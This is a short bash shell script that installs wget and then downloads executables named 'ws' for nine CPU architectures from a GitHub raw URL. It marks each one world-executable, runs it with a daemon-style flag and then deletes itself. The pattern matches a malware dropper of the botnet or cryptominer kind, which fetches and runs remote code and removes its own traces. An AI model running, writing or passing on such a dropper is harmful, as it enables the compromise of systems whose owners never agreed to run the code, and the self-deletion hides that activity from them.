#! /bin/bash
apt install wget -y
yum install wget -y
wget https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/w/ws.386 -O a && chmod 777 a && ./a -d=true
wget https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/w/ws.amd64 -O a && chmod 777 a && ./a -d=true
wget https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/w/ws.arm -O a && chmod 777 a && ./a -d=true
wget https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/w/ws.arm64 -O a && chmod 777 a && ./a -d=true
wget https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/w/ws.mips -O a && chmod 777 a && ./a -d=true
wget https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/w/ws.mips64 -O a && chmod 777 a && ./a -d=true
wget https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/w/ws.ppc64 -O a && chmod 777 a && ./a -d=true
wget https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/w/ws.ppc64le -O a && chmod 777 a && ./a -d=true
wget https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/w/ws.s390x -O a && chmod 777 a && ./a -d=true
rm $0
